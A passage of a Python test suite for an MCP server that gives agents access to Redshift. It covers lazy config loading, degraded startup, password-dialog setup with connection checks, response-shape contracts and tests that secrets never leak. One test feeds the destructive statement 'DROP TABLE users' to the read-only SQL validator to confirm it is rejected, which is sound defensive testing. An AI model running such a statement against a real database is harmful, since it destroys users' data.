    def test_config_property_is_lazy_not_cached(self):
        """Each access to `tools.config` invokes the provider afresh — no
        process-internal cache. This is what makes lazy re-resolution
        actually pick up new keychain writes (no cache to invalidate)."""
        call_count = [0]
        sentinel = object()

        def provider():
            call_count[0] += 1
            return sentinel

        tools = RedshiftTools(provider)

        assert tools.config is sentinel
        assert tools.config is sentinel
        assert tools.config is sentinel
        assert call_count[0] == 3, (
            f"@property config should call provider on every access "
            f"(got {call_count[0]} calls for 3 accesses — caching has crept in)"
        )

    def test_guarded_does_not_catch_non_configuration_errors(self, mock_config):
        """@_guarded converts ConfigurationError to not_configured response.
        Other exceptions (validation, DB errors, etc.) MUST propagate
        unchanged so FastMCP can surface them through normal error handling.
        Catches the bug where someone widens the except clause to bare
        Exception, hiding real failures behind a misleading not_configured
        response."""
        config, mock_conn = mock_config
        tools = RedshiftTools(lambda: config)

        execute_sql = _get_tool_fn(tools, 'execute_sql')

        # validate_read_only_sql raises plain ValueError (not ConfigurationError)
        # → must propagate, NOT get caught by @_guarded
        with pytest.raises(ValueError, match="SELECT and WITH"):
            execute_sql(sql_statement="DROP TABLE users")


class TestServerStartup:
    """v0.7.0 degraded-mode contract at the server entry point: server.main()
    must NOT raise when no profile is configured."""

    def test_server_main_does_not_crash_when_no_profile(self, monkeypatch, tmp_path):
        """The keystone test: invoke server.main() with an empty XDG config
        dir + stubbed mcp_server.run(). Pre-v0.7.0 this raised
        ValueError("Profile 'default' is not configured...") and exited with
        traceback. Post-v0.7.0 it must enter the stdio loop. A failure here
        means someone re-introduced upfront resolve_connection_params() in
        main()."""
        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))  # empty config dir
        monkeypatch.delenv("REDSHIFT_COMMENT_PROFILE", raising=False)
        monkeypatch.setattr("sys.argv", ["redshift-comment-mcp"])

        # Stub mcp_server.run() so this test doesn't enter the actual stdio
        # blocking loop. FastMCP's .run method is replaced at class level →
        # any instance the server creates uses the stub.
        run_invocations = []
        from fastmcp import FastMCP
        monkeypatch.setattr(
            FastMCP,
            "run",
            lambda self, *args, **kwargs: run_invocations.append(self),
        )

        from redshift_comment_mcp import server as server_module

        # The assertion is the call itself — it must NOT raise.
        server_module.main()

        # And mcp_server.run() should have been entered exactly once, proving
        # the server reached the stdio-loop step instead of bailing early.
        assert len(run_invocations) == 1, (
            f"mcp_server.run() invoked {len(run_invocations)} times "
            f"(expected exactly 1 — server should reach the stdio loop even "
            f"without a configured profile)"
        )


# ===== Polish round-3: connection verification + get_setup_status =====
#
# These tests cover the additional safety net (test connection after
# keychain write) and the new read-only status tool.


class TestSetupViaDialogConnectionVerification:
    """setup_via_dialog now tests the Redshift connection after writing the
    profile + password. This catches "wrote successfully but connection
    fails" silent lies (typo'd host / VPN not connected / wrong password /
    paused cluster) BEFORE the agent declares setup done."""

    def _make_tools(self):
        from redshift_comment_mcp.config import ConfigurationError
        def provider():
            raise ConfigurationError("not yet")
        return RedshiftTools(provider)

    def _setup_common_mocks(self, monkeypatch, dialog_returns=("pw", "ok")):
        """Stub the chain up to the connection-test step."""
        monkeypatch.setattr(
            'redshift_comment_mcp.config.write_profile',
            lambda name, **kw: None,
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.config.set_password',
            lambda name, pw: None,
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: dialog_returns,
        )

    def test_connection_test_passes_returns_configured_with_tested_flag(self, monkeypatch):
        self._setup_common_mocks(monkeypatch)
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._test_redshift_connection',
            lambda *args, **kw: (True, None),
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(host='h', user='u', dbname='d')

        assert result["status"] == "configured"
        assert result["tested"] is True
        assert "succeeded" in result["message"].lower()

    def test_connection_test_fails_returns_configured_but_connection_failed(self, monkeypatch, caplog):
        """The keystone safety: profile fields and password were saved, but
        the connection test caught a mismatch. Agent should NOT declare
        setup done; should re-prompt user.

        Also verifies M3 polish — connection-test failure is logged
        server-side at WARNING level (not just surfaced in the response)
        so an operator looking at server.log later can correlate."""
        import logging as _logging
        self._setup_common_mocks(monkeypatch)
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._test_redshift_connection',
            lambda *args, **kw: (False, "Connection timed out (host unreachable)"),
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        with caplog.at_level(_logging.WARNING, logger='redshift_comment_mcp.redshift_tools'):
            result = setup_via_dialog(host='wrong.example.com', user='u', dbname='d')

        assert result["status"] == "configured_but_connection_failed"
        assert result["tested"] is False
        assert "timed out" in result["connection_error"]
        # Message must include diagnostic hints the agent can relay to user
        assert "VPN" in result["message"] or "host" in result["message"].lower()
        # Profile name preserved so agent knows which one to re-setup
        assert result["profile"] == "default"
        # M3: server-side WARNING log must include profile + cluster coords
        # + the underlying connection error, so operators can debug
        warning_records = [r for r in caplog.records if r.levelno == _logging.WARNING]
        assert len(warning_records) >= 1, (
            "connection-test failure must produce a server-side WARNING log "
            "(was missing pre-round-7); operator-side debugging relied on "
            "this entry"
        )
        log_text = " ".join(r.getMessage() for r in warning_records)
        assert "default" in log_text  # profile name
        assert "wrong.example.com" in log_text  # cluster host
        assert "timed out" in log_text.lower()  # underlying error

    def test_connection_test_args_include_resolved_values(self, monkeypatch):
        """Verify _test_redshift_connection is called with the actual
        host/port/user/password/dbname the tool received — guards against
        accidentally passing wrong args (e.g. dropping port, swapping
        user/dbname order)."""
        self._setup_common_mocks(monkeypatch, dialog_returns=("the-password", "ok"))
        captured = {}
        def capture(host, port, user, password, dbname):
            captured.update(host=host, port=port, user=user,
                            password=password, dbname=dbname)
            return (True, None)
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._test_redshift_connection', capture,
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')
        setup_via_dialog(host='h.example.com', user='alice',
                         dbname='analytics', port=5430)

        assert captured == {
            'host': 'h.example.com',
            'port': 5430,
            'user': 'alice',
            'password': 'the-password',
            'dbname': 'analytics',
        }


def _raise_write_profile_failure(*_a, **_kw):
    """Stand-in for an unwritable config dir / full disk."""
    raise PermissionError("config directory not writable")


def _raise_keychain_failure(*_a, **_kw):
    """Stand-in for a keychain backend refusing the write."""
    raise RuntimeError("keychain refused the write")


# Every response shape setup_via_dialog can return, as of v0.10.0.
#
# Each row: (case id, stub overrides, call-arg overrides, (discriminator key,
# discriminator value), exact top-level key set, expected values). The key
# sets were read off ``git show v0.10.0:src/redshift_comment_mcp/redshift_tools.py``
# and are unchanged at HEAD.
#
# `expected values` is a per-key map checked by value AND by type; ``{}``
# means the row pins its key set only. `configured_but_connection_failed`
# echoes the caller's fields back, and nothing else in the suite asserts what
# those echoed values are — so ``"port": str(port)`` or a user/dbname swap
# would keep every key name and slip through. Its sibling `configured` is
# value-pinned by test_success_writes_both_stores_and_reports_tested_true.
_SETUP_RESPONSE_SHAPES = [
    (
        "configured",
        {},
        {},
        ("status", "configured"),
        {"status", "profile", "host", "port", "user", "dbname", "tested",
         "message"},
        {},
    ),
    (
        "configured_but_connection_failed",
        {"connection": (False, "Connection timed out (host unreachable)")},
        {},
        ("status", "configured_but_connection_failed"),
        {"status", "profile", "host", "port", "user", "dbname", "tested",
         "connection_error", "message"},
        {"profile": "prod", "host": "h.example.com", "port": 5439,
         "user": "alice", "dbname": "analytics", "tested": False,
         "connection_error": "Connection timed out (host unreachable)"},
    ),
    (
        "dialog_cancelled",
        {"dialog": (None, "cancelled")},
        {},
        ("status", "dialog_cancelled"),
        {"status", "profile", "message"},
        {},
    ),
    (
        "permission_denied",
        {"dialog": (None, "permission_denied")},
        {},
        ("status", "permission_denied"),
        {"status", "profile", "platform", "message"},
        {},
    ),
    (
        "dialog_unavailable",
        {"dialog": (None, "unavailable")},
        {},
        ("status", "dialog_unavailable"),
        {"status", "profile", "platform", "message"},
        {},
    ),
    (
        "platform_unsupported",
        {"dialog": (None, "unsupported")},
        {},
        ("status", "platform_unsupported"),
        {"status", "profile", "platform", "message"},
        {},
    ),
    (
        "empty_password",
        {"dialog": ("", "ok")},
        {},
        ("status", "empty_password"),
        {"status", "profile", "message"},
        {},
    ),
    (
        "missing_field",
        {},
        {"host": ""},
        ("error", "missing_field"),
        {"error", "exception_class", "message"},
        {},
    ),
    (
        "write_profile_failed",
        {"write_profile": _raise_write_profile_failure},
        {},
        ("error", "write_profile_failed"),
        {"error", "exception_class", "message"},
        {},
    ),
    (
        "keychain_write_failed",
        {"set_password": _raise_keychain_failure},
        {},
        ("error", "keychain_write_failed"),
        {"error", "exception_class", "message"},
        {},
    ),
]


class TestSetupViaDialogResponseShapeContract:
    """Structural pin on all ten setup_via_dialog responses.

    These are the tool's wire contract: agents (and the skills in
    skills/redshift-setup/) branch on the `status` / `error` value and read
    named fields off the response. Renaming a field or a status string is a
    breaking change that no other test would catch — the existing tests each
    assert one or two keys of the shape they happen to exercise, so a dropped
    or added key slips through.

    Deliberately NOT pinned: the `message` prose. Four of those messages were
    rewritten when the write ordering changed, and more may change; freezing
    wording here would turn every copy edit into a test failure. What is
    pinned is the discriminator value, the exact top-level key set, and — for
    rows that carry an expected-value map — the value and type behind each
    named key.
    """

    def _make_tools(self):
        from redshift_comment_mcp.config import ConfigurationError

        def provider():
            raise ConfigurationError("not yet")
        return RedshiftTools(provider)

    @staticmethod
    def _stub(monkeypatch, *, dialog=("dialog-secret", "ok"),
              write_profile=None, set_password=None, connection=(True, None)):
        """Stub the whole chain; each case overrides just the step it bends."""
        monkeypatch.setattr(
            'redshift_comment_mcp.config.write_profile',
            write_profile or (lambda name, **kw: None),
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.config.set_password',
            set_password or (lambda name, pw: None),
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: dialog,
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._test_redshift_connection',
            lambda *a, **kw: connection,
        )

    def _call(self, monkeypatch, tmp_path, stub, call_overrides):
        # Scope the config store to a tmp root FIRST. The keychain_write_failed
        # row drives the real rollback, which resolves `cfg.config_path()` and
        # can write or unlink it; without this the developer's own
        # ~/.config/redshift-comment-mcp/config.toml is the file under test.
        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))
        self._stub(monkeypatch, **stub)
        setup_via_dialog = _get_tool_fn(self._make_tools(), 'setup_via_dialog')
        kwargs = {
            'host': 'h.example.com',
            'user': 'alice',
            'dbname': 'analytics',
            'profile': 'prod',
            'port': 5439,
        }
        kwargs.update(call_overrides)
        return setup_via_dialog(**kwargs)

    @pytest.mark.parametrize(
        "case_id,stub,call_overrides,discriminator,expected_keys,expected_values",
        _SETUP_RESPONSE_SHAPES,
        ids=[row[0] for row in _SETUP_RESPONSE_SHAPES],
    )
    def test_response_shape_unchanged(self, monkeypatch, tmp_path, case_id,
                                      stub, call_overrides, discriminator,
                                      expected_keys, expected_values):
        result = self._call(monkeypatch, tmp_path, stub, call_overrides)

        disc_key, disc_value = discriminator
        assert result.get(disc_key) == disc_value, (
            f"{case_id}: the {disc_key!r} string agents branch on changed — "
            f"got {result.get(disc_key)!r}. Full response: {result}"
        )
        assert set(result) == expected_keys, (
            f"{case_id}: top-level key set changed. "
            f"missing={expected_keys - set(result)} "
            f"unexpected={set(result) - expected_keys}. "
            f"These keys are the tool's wire contract; renaming or dropping "
            f"one breaks every agent that reads it."
        )
        for key, expected in expected_values.items():
            actual = result[key]
            assert actual == expected and type(actual) is type(expected), (
                f"{case_id}: {key!r} is {actual!r} ({type(actual).__name__}), "
                f"expected {expected!r} ({type(expected).__name__}). The key "
                f"set is unchanged, so only a value pin catches this — a "
                f"stringified port or two swapped fields read as valid to "
                f"every agent consuming the response."
            )

    def test_success_writes_both_stores_and_reports_tested_true(self, monkeypatch):
        """A3 positive: a fully successful call still writes host/port/user/
        dbname AND the password, and still reports the connection result."""
        write_calls = []
        set_pw_calls = []
        self._stub(
            monkeypatch,
            write_profile=lambda name, **kw: write_calls.append((name, kw)),
            set_password=lambda name, pw: set_pw_calls.append((name, pw)),
            connection=(True, None),
        )
        setup_via_dialog = _get_tool_fn(self._make_tools(), 'setup_via_dialog')

        result = setup_via_dialog(host='h.example.com', user='alice',
                                  dbname='analytics', profile='prod', port=5439)

        assert write_calls == [
            ('prod', {'host': 'h.example.com', 'port': 5439,
                      'user': 'alice', 'dbname': 'analytics'}),
        ]
        assert set_pw_calls == [('prod', 'dialog-secret')]
        assert result["status"] == "configured"
        assert result["tested"] is True
        assert result["profile"] == "prod"
        assert result["host"] == "h.example.com"
        assert result["port"] == 5439
        assert result["user"] == "alice"
        assert result["dbname"] == "analytics"
        # No connection_error key on the success shape — its presence is what
        # distinguishes the failed-connection shape from this one.
        assert "connection_error" not in result

    def test_connection_failure_reports_tested_false_with_error(self, monkeypatch):
        """A3 negative: both stores were written, but the connection test
        failed — the tool must say so rather than claim `configured`."""
        write_calls = []
        set_pw_calls = []
        self._stub(
            monkeypatch,
            write_profile=lambda name, **kw: write_calls.append((name, kw)),
            set_password=lambda name, pw: set_pw_calls.append((name, pw)),
            connection=(False, "Connection timed out (host unreachable)"),
        )
        setup_via_dialog = _get_tool_fn(self._make_tools(), 'setup_via_dialog')

        result = setup_via_dialog(host='h.example.com', user='alice',
                                  dbname='analytics', profile='prod', port=5439)

        assert len(write_calls) == 1
        assert len(set_pw_calls) == 1
        assert result["status"] == "configured_but_connection_failed"
        assert result["tested"] is False
        assert result["connection_error"] == "Connection timed out (host unreachable)"
        assert result["profile"] == "prod"


class TestGetSetupStatusTool:
    """The read-only setup-status tool. Safe to call at session start;
    returns non-secrets only; agents use it to decide whether to call
    setup_via_dialog proactively."""

    def _make_tools(self):
        from redshift_comment_mcp.config import ConfigurationError
        def provider():
            raise ConfigurationError("doesn't matter — get_setup_status doesn't touch the provider")
        return RedshiftTools(provider)

    def test_get_setup_status_unconfigured_returns_false_with_next_step(self, monkeypatch):
        """Fresh install case: no config.toml entry, no keychain."""
        monkeypatch.setattr('redshift_comment_mcp.config.read_profile',
                            lambda name: None)
        monkeypatch.setattr('redshift_comment_mcp.config.get_password',
                            lambda name: None)
        # No explicit profile arg is passed below, so get_setup_status now
        # resolves through resolve_active_profile (fixing the pre-existing
        # "always literal 'default'" bug) rather than reading the real
        # on-disk config.toml directly — pin what it resolves to.
        monkeypatch.setattr('redshift_comment_mcp.config.resolve_active_profile',
                            lambda cli_profile=None: cli_profile or "default")

        tools = self._make_tools()
        get_setup_status = _get_tool_fn(tools, 'get_setup_status')

        result = get_setup_status()

        assert result["profile"] == "default"
        assert result["configured"] is False
        assert result["has_fields"] is False
        assert result["has_password"] is False
        # Non-secret fields absent when has_fields=False
        assert "host" not in result
        assert "user" not in result
        # Agent guidance for next step
        assert "next_step" in result
        assert "setup_via_dialog" in result["next_step"]

    def test_get_setup_status_fields_only_no_password(self, monkeypatch):
        """Edge case: config.toml has the profile but keychain entry was
        deleted (e.g. via `delete-profile` then re-add of fields only)."""
        monkeypatch.setattr(
            'redshift_comment_mcp.config.read_profile',
            lambda name: {'host': 'h', 'port': 5439, 'user': 'u', 'dbname': 'd'},
        )
        monkeypatch.setattr('redshift_comment_mcp.config.get_password',
                            lambda name: None)
        monkeypatch.setattr('redshift_comment_mcp.config.resolve_active_profile',
                            lambda cli_profile=None: cli_profile or "default")

        tools = self._make_tools()
        get_setup_status = _get_tool_fn(tools, 'get_setup_status')

        result = get_setup_status()

        assert result["configured"] is False  # NOT fully configured
        assert result["has_fields"] is True
        assert result["has_password"] is False
        # Non-secret fields exposed
        assert result["host"] == 'h'
        assert result["user"] == 'u'
        # next_step adapts to this partial state
        assert "password" in result["next_step"].lower()

    def test_get_setup_status_fully_configured(self, monkeypatch):
        monkeypatch.setattr(
            'redshift_comment_mcp.config.read_profile',
            lambda name: {'host': 'h.example.com', 'port': 5439,
                          'user': 'alice', 'dbname': 'analytics'},
        )
        monkeypatch.setattr('redshift_comment_mcp.config.get_password',
                            lambda name: 'some-password')

        tools = self._make_tools()
        get_setup_status = _get_tool_fn(tools, 'get_setup_status')

        result = get_setup_status(profile='default')

        assert result["configured"] is True
        assert result["has_fields"] is True
        assert result["has_password"] is True
        assert result["host"] == 'h.example.com'
        assert result["user"] == 'alice'
        # No next_step when already configured
        assert "next_step" not in result

    def test_get_setup_status_never_returns_password_value(self, monkeypatch):
        """Hard security invariant: even when has_password=True, the actual
        password string MUST NEVER appear anywhere in the response. Catches
        a future careless refactor where someone adds the password to the
        response by accident."""
        secret = "super-secret-password-do-not-leak"
        monkeypatch.setattr(
            'redshift_comment_mcp.config.read_profile',
            lambda name: {'host': 'h', 'port': 5439, 'user': 'u', 'dbname': 'd'},
        )
        monkeypatch.setattr('redshift_comment_mcp.config.get_password',
                            lambda name: secret)
        monkeypatch.setattr('redshift_comment_mcp.config.resolve_active_profile',
                            lambda cli_profile=None: cli_profile or "default")

        tools = self._make_tools()
        get_setup_status = _get_tool_fn(tools, 'get_setup_status')

        result = get_setup_status()

        # Scan all string values in the response for the secret — catches
        # accidental inclusion in any field (host, message, next_step, etc).
        import json
        serialized = json.dumps(result)
        assert secret not in serialized, (
            "get_setup_status leaked the password value in the response — "
            "this is a security regression"
        )

    def test_get_setup_status_works_in_degraded_mode(self, monkeypatch):
        """get_setup_status must work even when the lazy provider raises
        ConfigurationError — that's literally what makes it useful at
        session start (no profile yet)."""
        from redshift_comment_mcp.config import ConfigurationError

        def failing_provider():
            raise ConfigurationError("not yet configured")

        monkeypatch.setattr('redshift_comment_mcp.config.read_profile',
                            lambda name: None)
        monkeypatch.setattr('redshift_comment_mcp.config.get_password',
                            lambda name: None)
        monkeypatch.setattr('redshift_comment_mcp.config.resolve_active_profile',
                            lambda cli_profile=None: cli_profile or "default")

        tools = RedshiftTools(failing_provider)
        get_setup_status = _get_tool_fn(tools, 'get_setup_status')

        # Must NOT raise; must NOT return not_configured error
        result = get_setup_status()
        assert "error" not in result, (
            "get_setup_status should not be guarded by @_guarded — it "
            "needs to work when the provider raises (its whole point)"
        )
        assert result["configured"] is False

    def test_get_setup_status_profile_mode_labels_source(self, monkeypatch):
        """Backward case: no inline provider → source='profile' so the agent
        can tell which config mechanism it's reading."""
        monkeypatch.setattr(
            'redshift_comment_mcp.config.read_profile',
            lambda name: {'host': 'h', 'port': 5439, 'user': 'u', 'dbname': 'd'},
        )
        monkeypatch.setattr('redshift_comment_mcp.config.get_password',
                            lambda name: 'pw')
        monkeypatch.setattr('redshift_comment_mcp.config.resolve_active_profile',
                            lambda cli_profile=None: cli_profile or "default")

        tools = self._make_tools()
        get_setup_status = _get_tool_fn(tools, 'get_setup_status')

        result = get_setup_status()
        assert result["source"] == "profile"

    def test_get_setup_status_inline_mode_reports_configured(self, monkeypatch):
        """The core bug: server launched in inline mode (plugin UI host/user/
        dbname + REDSHIFT_PASSWORD env). get_setup_status must report
        configured=True with source='inline' — NOT a false 'not configured'
        derived from the unused profile/keychain path. It must NOT depend on
        the keychain at all in this mode.

        Uses ``status_provider`` — the single decision seam that replaced
        the old inline-only ``inline_status_provider`` (which shared only
        mode detection, not the full decision) — supplying a
        ``ConnectionDecision`` the way ``server.resolve_connection_decision``
        does in production.
        """
        # Profile/keychain are EMPTY — proves inline path is independent of them.
        monkeypatch.setattr('redshift_comment_mcp.config.read_profile',
                            lambda name: None)
        monkeypatch.setattr('redshift_comment_mcp.config.get_password',
                            lambda name: None)

        from redshift_comment_mcp.config import ConfigurationError
        def provider():
            raise ConfigurationError("doesn't matter")
        tools = RedshiftTools(
            provider,
            status_provider=lambda profile: ConnectionDecision(
                mechanism="inline",
                host="h.example.com", port=5439, user="yihan.chang",
                dbname="dbt_pipeline",
                has_fields=True, has_password=True, password="env-password",
                profile_name=None,
            ),
        )
        get_setup_status = _get_tool_fn(tools, 'get_setup_status')

        result = get_setup_status()

        assert result["configured"] is True
        assert result["source"] == "inline"
        assert result["has_fields"] is True
        assert result["has_password"] is True
        assert result["host"] == "h.example.com"
        assert result["user"] == "yihan.chang"
        assert result["dbname"] == "dbt_pipeline"
        assert "next_step" not in result

        # Hard security invariant, same as test_get_setup_status_never_returns_password_value.
        import json
        assert "env-password" not in json.dumps(result)

    def test_get_setup_status_inline_mode_missing_password(self, monkeypatch):
        """Inline host/user/dbname present but no password (REDSHIFT_PASSWORD
        unset / blank) → configured=False, source='inline', and next_step
        points at the env var, NOT at setup_via_dialog (wrong mechanism)."""
        monkeypatch.setattr('redshift_comment_mcp.config.read_profile',
                            lambda name: None)
        monkeypatch.setattr('redshift_comment_mcp.config.get_password',
                            lambda name: None)

        from redshift_comment_mcp.config import ConfigurationError
        def provider():
            raise ConfigurationError("doesn't matter")
        tools = RedshiftTools(
            provider,
            status_provider=lambda profile: ConnectionDecision(
                mechanism="inline",
                host="h.example.com", port=5439, user="alice", dbname="analytics",
                has_fields=True, has_password=False, password=None,
                profile_name=None,
            ),
        )
        get_setup_status = _get_tool_fn(tools, 'get_setup_status')

        result = get_setup_status()

        assert result["configured"] is False
        assert result["source"] == "inline"
        assert result["has_fields"] is True
        assert result["has_password"] is False
        assert "REDSHIFT_PASSWORD" in result["next_step"]

    def test_get_setup_status_borrowed_mode_reports_inline_host_and_borrowed_source(
        self, monkeypatch,
    ):
        """W0-02 A3 positive. W0-01 lets the server borrow a keychain
        password from a profile whose host/user/dbname all match the inline
        launch values, and connect to the INLINE target. get_setup_status
        must report that exact mechanism (neither plain 'inline' nor plain
        'profile') and the inline target — not the matched profile's — plus
        which profile the password came from, so an agent reading this tool
        can tell what actually happened."""
        secret = "borrowed-pw-should-never-leak"
        from redshift_comment_mcp.config import ConfigurationError
        def provider():
            raise ConfigurationError("doesn't matter — get_setup_status doesn't touch the provider")
        tools = RedshiftTools(
            provider,
            status_provider=lambda profile: ConnectionDecision(
                mechanism="borrowed",
                host="h.example.com", port=5439, user="yihan.chang",
                dbname="dbt_pipeline",
                has_fields=True, has_password=True, password=secret,
                profile_name="default",
            ),
        )
        get_setup_status = _get_tool_fn(tools, 'get_setup_status')

        result = get_setup_status()

        assert result["configured"] is True
        assert result["source"] == "borrowed"
        assert result["has_fields"] is True
        assert result["has_password"] is True
        assert result["host"] == "h.example.com"
        assert result["user"] == "yihan.chang"
        assert result["dbname"] == "dbt_pipeline"
        assert result["borrowed_from_profile"] == "default"
        assert "next_step" not in result

        import json
        assert secret not in json.dumps(result), (
            "get_setup_status leaked the borrowed password value in the "
            "response — this is a security regression"
        )

    def test_get_setup_status_profile_mode_named_other_than_default_reports_configured(
        self, tmp_path, monkeypatch,
    ):
        """W0-02 A3 negative. Pre-existing bug: get_setup_status read
        cfg.read_profile(profile) using the literal default "default" and
        never called resolve_active_profile — so a user whose only profile
        has another name (the documented upgrade-rescue case in config.py's
        resolve_active_profile) was told configured=False while the server
        connects normally. Exercises the REAL config store + the real
        resolve_active_profile (not a stub) so the upgrade-rescue fallback
        itself is under test, mirroring
        test_server_resolution.test_profile_mode_single_non_default_profile_auto_resolves.
        """
        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))
        storage: dict = {}
        import keyring as _kr
        monkeypatch.setattr(
            _kr, "set_password",
            lambda service, user, password: storage.__setitem__((service, user), password),
        )
        monkeypatch.setattr(_kr, "get_password", lambda service, user: storage.get((service, user)))

        from redshift_comment_mcp import config as cfg
        cfg.write_profile(
            "ichef-prod",
            host="ichef-prod.example.com", port=5439, user="alice", dbname="warehouse",
        )
        cfg.set_password("ichef-prod", "ichef-pw")

        tools = self._make_tools()
        get_setup_status = _get_tool_fn(tools, 'get_setup_status')

        result = get_setup_status()  # no profile arg — must not assume "default"

        assert result["configured"] is True
        assert result["source"] == "profile"
        assert result["profile"] == "ichef-prod"
        assert result["has_fields"] is True
        assert result["has_password"] is True
        assert result["host"] == "ichef-prod.example.com"
        assert result["user"] == "alice"
        assert result["dbname"] == "warehouse"

        import json
        assert "ichef-pw" not in json.dumps(result)
